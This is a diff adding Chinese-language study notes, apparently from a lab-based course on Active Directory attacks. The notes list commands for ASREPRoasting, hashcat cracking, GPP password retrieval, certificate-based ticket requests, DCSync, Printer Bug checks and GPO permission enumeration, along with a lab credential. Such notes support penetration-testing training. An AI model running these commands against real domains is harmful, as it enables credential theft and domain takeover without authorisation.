@@ -1,3 +1,11 @@
+建议就以下主题进行一些研究：
+
+Active Directory 证书服务 (AD CS) 攻击
+Kerberos 约束委派
+Kerberos 非约束委派
+Kerberos 基于资源的约束委派 (RBCD)
+
+
 但如果没有域中任何主机的本地管理员权限怎么办？
 还有几种方法可以在 Windows 域中移动：
   远程桌面协议 (Remote Desktop Protocol) (RDP) - 可提供对目标主机的 GUI 访问
@@ -128,4 +136,72 @@ OR
 C:\Tools> .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt
 OR
 在 Windows 攻击主机上使用 Mimikatz 执行 DCSync
+
+
+Misc
+Exchange 相关的组成员:
+攻陷一台 Exchange 服务器，这通常会导致获得域管理员权限
+从 Exchange 服务器内存中转储凭据会产生数十甚至数百个明文凭据或 NTLM 哈希
+这通常是由于用户登录 Outlook Web Access (OWA) 后，Exchange 在成功登录后将其凭据缓存在内存中
+PrivExchange:
+允许任何拥有邮箱的域用户强制 Exchange 服务器通过 HTTP 向客户端提供的任何主机进行身份验证
+可以被利用来中继到 LDAP 并转储域 NTDS 数据库
+可以用任何经过身份验证的域用户帐户直接获得域管理员权限
+Printer Bug:
+任何域用户都可以使用 RpcOpenPrinter 方法连接到 spooler 的命名管道 (named pipe)
+并使用 RpcRemoteFindFirstPrinterChangeNotificationEx 方法
+强制服务器通过 SMB 向客户端提供的任何主机进行身份验证
+可用于中继 LDAP 身份验证
+可以用来攻陷另一个林中启用了非约束委派 (Unconstrained Delegation) 的主机，例如域控制器
+攻陷了一个林，它就可以跨林信任 (forest trust) 进行攻击
+C:\htb> Import-Module .\SecurityAssessment.ps1
+C:\htb> Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+MS14-068：
+创建一个假的 PAC，将用户呈现为域管理员组或其他特权组的成员
+特权属性证书 (Privilege Attribute Certificate, PAC) 中的帐户名、ID 和组成员身份
+PAC 由密钥分发中心 (Key Distribution Center, KDC) 使用密钥进行签名，以验证 PAC 在创建后未被篡改
+嗅探 LDAP 凭据：
+许多应用程序和打印机在其 Web 管理控制台中存储 LDAP 凭据以连接到域
+方法是将 LDAP IP 地址更改为攻击主机的地址，并在 LDAP 端口 389 上设置一个 netcat 监听器
+枚举 DNS 记录：
+使用像 adidnsdump 这样的工具，通过一个有效的域用户帐户来枚举域中的所有 DNS 记录，发现有趣主机
+  https://github.com/dirkjanm/adidnsdump
+使用 Get-Domain User 在描述字段中查找密码：
+C:\htb> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
+PASSWD_NOTREQD 字段：
+设置了此字段，则用户不受当前密码策略 (password policy) 长度的限制，这意味着可以有更短的密码或根本没有密码（如果域中允许空密码 (empty passwords)）
+Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
+SMB 共享和 SYSVOL 脚本中的凭据：
+SYSVOL 共享，可能会在 scripts 目录中找到许多不同的批处理脚本、VBScript 和 PowerShell 脚本，以寻找存储在脚本中的密码
+组策略首选项 (GPP) 密码：
+当创建新的组策略首选项 (Group Policy Preferences, GPP) 时，会在 SYSVOL 共享中创建一个 .xml 文件，该文件也会在应用该组策略的终端上本地缓存。这些文件可能包括用于以下目的的文件：
+映射驱动器 (drives.xml)
+创建本地用户
+创建打印机配置文件 (printers.xml)
+创建和更新服务 (services.xml)
+创建计划任务 (scheduledtasks.xml)
+更改本地管理员密码
+crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
+ASREPRoasting：
+ASREPRoasting 与 Kerberoasting 类似，但它攻击的是 AS-REP 而不是 TGS-REP
+不需要服务主体名称 (Service Principal Name, SPN)。可以使用 PowerView 或内置工具（如 PowerShell AD 模块）来枚举此设置
+可以使用 Rubeus 工具包和其他工具来执行，以获取目标帐户的票据。如果攻击者对某个帐户拥有 GenericWrite 或 GenericAll 权限
+C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
+hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
+OR
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt      检索用户
+GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users      寻找所有不需要 Kerberos 预身份验证的用户
+组策略对象 (GPO) 滥用：
+可被滥用以执行以下攻击
+向用户添加额外权限（如 SeDebugPrivilege、SeTakeOwnershipPrivilege 或 SeImpersonatePrivilege）
+向一台或多台主机添加本地管理员用户
+创建一个立即执行的计划任务来执行任意数量的操作
+Get-DomainGPO |select displayname      枚举 GPO 名称
+OR
+Get-GPO -All | Select DisplayName      枚举 GPO 名称
+C:\htb> $sid=Convert-NameToSid "Domain Users"
+C:\htb> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}      枚举 Domain Users 的 GPO 权限，找例如 WriteProperty 和 WriteDacl 权限
+C:\htb Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532      将 GPO GUID 转换为名称
+
 
